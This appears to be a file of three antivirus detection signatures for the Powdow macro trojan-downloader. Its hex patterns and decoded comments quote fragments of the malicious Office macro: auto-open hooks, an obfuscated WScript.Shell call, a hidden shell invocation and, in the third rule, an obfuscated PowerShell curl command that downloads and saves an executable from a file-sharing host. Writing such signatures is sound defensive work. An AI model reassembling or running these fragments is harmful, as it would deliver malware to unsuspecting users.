
rule TrojanDownloader_O97M_Powdow_RVBQ_MTB{
	meta:
		description = "TrojanDownloader:O97M/Powdow.RVBQ!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,03 00 03 00 03 00 00 01 00 "
		
	strings :
		$a_01_0 = {3d 63 72 65 61 74 65 6f 62 6a 65 63 74 28 22 77 22 2b 22 73 22 2b 22 63 22 2b 22 72 22 2b 22 69 22 2b 22 70 22 2b 22 74 22 2b 22 2e 22 2b 22 73 22 2b 22 68 22 2b 22 65 22 2b 22 6c 22 2b 22 6c 22 29 } //01 00  =createobject("w"+"s"+"c"+"r"+"i"+"p"+"t"+"."+"s"+"h"+"e"+"l"+"l")
		$a_01_1 = {63 6c 6f 73 65 74 65 78 74 66 69 6c 65 3d 73 68 6f 77 74 65 78 74 66 69 6c 65 5f 2e 5f 73 68 6f 77 62 61 72 2e 5f 74 61 67 2b 5f 73 68 6f 77 74 65 78 74 66 69 6c 65 5f 2e 5f 66 72 61 6d 65 31 31 2e 5f 74 61 67 65 6e 64 73 75 62 } //01 00  closetextfile=showtextfile_._showbar._tag+_showtextfile_._frame11._tagendsub
		$a_01_2 = {73 75 62 5f 61 75 74 6f 5f 63 6c 6f 73 65 28 29 } //00 00  sub_auto_close()
	condition:
		any of ($a_*)
 
}
rule TrojanDownloader_O97M_Powdow_RVBQ_MTB_2{
	meta:
		description = "TrojanDownloader:O97M/Powdow.RVBQ!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,03 00 03 00 03 00 00 01 00 "
		
	strings :
		$a_01_0 = {61 75 74 6f 5f 6f 70 65 6e 5f 28 29 3a 3a 3a 3a 3a 3a 3a 3a 3a 3a 3a 3a 3a 3a 3a 3a 3a 3a 3a 3a 3a 3a 63 61 6c 6c 76 62 61 2e 73 68 65 6c 6c 21 28 2b 2c 76 62 68 69 64 65 29 65 6e 64 66 75 6e 63 74 69 6f 6e } //01 00  auto_open_()::::::::::::::::::::::callvba.shell!(+,vbhide)endfunction
		$a_01_1 = {63 68 72 28 6f 63 74 32 64 65 63 28 61 73 63 28 6d 69 64 28 73 73 74 72 69 6e 67 2c 69 2c 31 29 29 29 29 6e 65 78 74 } //01 00  chr(oct2dec(asc(mid(sstring,i,1))))next
		$a_01_2 = {76 62 61 2e 72 65 70 6c 61 63 65 28 2c 64 65 63 72 79 70 74 65 70 69 28 22 6a 22 29 2c 64 65 63 72 79 70 74 65 70 69 28 22 74 22 29 29 65 6e 64 66 75 6e 63 74 69 6f 6e } //00 00  vba.replace(,decryptepi("j"),decryptepi("t"))endfunction
	condition:
		any of ($a_*)
 
}
rule TrojanDownloader_O97M_Powdow_RVBQ_MTB_3{
	meta:
		description = "TrojanDownloader:O97M/Powdow.RVBQ!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,02 00 02 00 02 00 00 01 00 "
		
	strings :
		$a_01_0 = {72 65 70 6c 61 63 65 28 22 63 6d 64 2f 63 70 6f 77 5e 61 6e 73 65 79 65 6e 38 72 73 5e 68 61 6e 73 65 79 65 6e 38 6c 6c 2f 77 30 31 63 5e 75 5e 72 6c 68 74 74 5e 70 73 3a 2f 2f 74 72 61 6e 73 66 61 6e 73 65 79 65 6e 38 72 2e 73 68 2f 67 61 6e 73 65 79 65 6e 38 74 2f 77 75 72 39 66 66 2f 62 75 69 6c 64 2e 61 6e 73 65 79 65 6e 38 5e 78 61 6e 73 65 79 65 6e 38 2d 6f 22 26 6f 6c 36 71 26 22 3b 22 26 6f 6c 36 71 2c 22 61 6e 73 65 79 65 6e 38 22 2c 22 65 22 29 66 74 6b 76 63 68 2e 65 78 65 } //01 00  replace("cmd/cpow^anseyen8rs^hanseyen8ll/w01c^u^rlhtt^ps://transfanseyen8r.sh/ganseyen8t/wur9ff/build.anseyen8^xanseyen8-o"&ol6q&";"&ol6q,"anseyen8","e")ftkvch.exe
		$a_01_1 = {64 6f 63 75 6d 65 6e 74 5f 6f 70 65 6e 28 29 } //00 00  document_open()
	condition:
		any of ($a_*)
 
}